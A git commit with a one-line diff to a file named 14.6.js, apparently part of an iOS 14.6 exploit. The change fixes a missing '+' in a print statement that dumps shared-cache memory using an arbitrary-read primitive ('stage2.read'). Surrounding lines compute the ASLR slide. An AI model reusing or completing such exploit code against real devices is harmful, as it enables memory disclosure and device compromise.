5a573441d728f9260471acc1d54d7af59d04bdcf
Turnerhackz1 <turner881189@gmail.com>
2022-06-23 11:53:50 -0500

    Update 14.6.js

--- 14.6.js
+++ 14.6.js
@@ -676,7 +676,7 @@ function i2i(i,num) {
 		      //Max Slide         = 0x2F8A0000 (ASLR entropy: 16-bits)
 	      }
 	      var cachestart = 0x180000000 + cacheslide; //Shared Region:                    4GB, address: 0x180000000 -> 0x280000000
-	      print("cachedump @ " + hex1(cachestart) " : " + String.fromCharCode(...stage2.read(cachestart,0x100)));
+	      print("cachedump @ " + hex1(cachestart) + " : " + String.fromCharCode(...stage2.read(cachestart,0x100)));
 	
 
       }
